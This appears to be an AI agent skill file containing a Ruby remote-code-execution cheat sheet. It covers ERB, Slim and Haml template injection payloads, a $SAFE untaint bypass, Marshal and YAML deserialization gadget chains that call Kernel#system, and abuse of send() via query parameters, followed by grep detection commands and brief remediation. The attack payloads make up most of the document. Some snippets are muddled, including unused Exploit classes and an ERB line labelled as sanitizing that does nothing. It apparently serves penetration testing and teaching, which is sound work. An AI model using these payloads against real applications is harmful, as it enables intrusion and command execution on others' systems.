---
name: ruby-sandbox-escape
description: Ruby sandbox and template engine escape techniques including ERB injection, Slim/Haml exploitation, $SAFE bypasses, and Marshal deserialization.
---

# Ruby Sandbox Escape Techniques

## 1. ERB Template Injection

**Vulnerable Pattern:** User input passed to ERB.new() and result().

### Detection

```bash
grep -rn "ERB\.new\|\.result\(" --include="*.rb" --include="*.erb"
grep -rn "<%= .*%>" --include="*.erb"
```

### Exploitation

```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= %x{id} %>
```

### In Ruby Code

```ruby
# Vulnerable
template = ERB.new(user_input)
template.result(binding)

# Payload
<%= `id` %>
```

---

## 2. Slim Template Injection

**Vulnerable Pattern:** User input in Slim templates.

### Detection

```bash
grep -rn "Slim::Template\|slim" --include="*.rb"
```

### Exploitation

```slim
= system('id')
= `id`
ruby:
  system('id')
```

---

## 3. Haml Template Injection

**Vulnerable Pattern:** User input in Haml templates.

### Detection

```bash
grep -rn "Haml::Engine\|haml" --include="*.rb"
```

### Exploitation

```haml
= system('id')
= `id`
- system('id')
```

---

## 4. $SAFE Level Bypasses (Legacy)

**Note:** $SAFE is deprecated in Ruby 2.7+ and removed in Ruby 3.0+

### Historical Context

```ruby
# $SAFE levels (legacy)
# 0 - No restrictions (default)
# 1 - Tainted strings can't be used in dangerous operations
# 2-4 - Progressively more restricted

# Bypass techniques (pre-Ruby 3.0)
$SAFE = 1
system(cmd.dup.untaint)  # Bypass via untaint
```

---

## 5. Marshal Deserialization

**Vulnerable Pattern:** Marshal.load() on untrusted data.

### Detection

```bash
grep -rn "Marshal\.load\|Marshal\.restore" --include="*.rb"
```

### Exploitation

```ruby
# Generate payload
require 'base64'

class Exploit
  def initialize
    @cmd = 'id'
  end

  def to_s
    `#{@cmd}`
  end
end

payload = Base64.encode64(Marshal.dump(Exploit.new))
```

### Universal Gadget Chain

```ruby
# Using ERB gadget
require 'erb'

class Exploit
  def initialize(cmd)
    @src = "<%= `#{cmd}` %>"
    @filename = "exploit.erb"
  end
end

erb = ERB.allocate
erb.instance_variable_set(:@src, "<%= `id` %>")
erb.instance_variable_set(:@filename, "x")

payload = Marshal.dump(erb)
```

---

## 6. YAML Deserialization

**Vulnerable Pattern:** YAML.load() on untrusted data (pre-Psych 4.0).

### Detection

```bash
grep -rn "YAML\.load\(" --include="*.rb"
# Note: YAML.safe_load is secure
```

### Exploitation (Ruby < 2.7 with Psych < 4.0)

```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 7. send() Method Exploitation

**Vulnerable Pattern:** Dynamic method calls with user input.

### Detection

```bash
grep -rn "\.send\(.*params\|\.public_send" --include="*.rb"
```

### Exploitation

```ruby
# Vulnerable
object.send(params[:method], params[:arg])

# Attack: ?method=system&arg=id
```

---

## 8. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    RUBY SANDBOX → RCE CHAIN                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Path 1: ERB/Slim/Haml Injection                                            │
│  └─> <%= system('cmd') %> or = `cmd`                                        │
│                                                                              │
│  Path 2: Marshal/YAML Deserialization                                       │
│  └─> Craft gadget chain payload                                             │
│  └─> ERB gadget or Gem:: gadgets                                            │
│                                                                              │
│  Path 3: Dynamic method calls                                               │
│  └─> object.send(user_input, args)                                          │
│  └─> Call system/exec with attacker args                                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 9. Remediation

```ruby
# Use safe_load for YAML
YAML.safe_load(data, permitted_classes: [])

# Avoid Marshal.load on untrusted data
# Use JSON instead

# Sanitize ERB input
ERB.new(template, trim_mode: '-').result(binding)
# Better: don't allow user-controlled templates

# Whitelist methods for send()
ALLOWED_METHODS = [:to_s, :to_i]
if ALLOWED_METHODS.include?(params[:method].to_sym)
  object.send(params[:method])
end
```
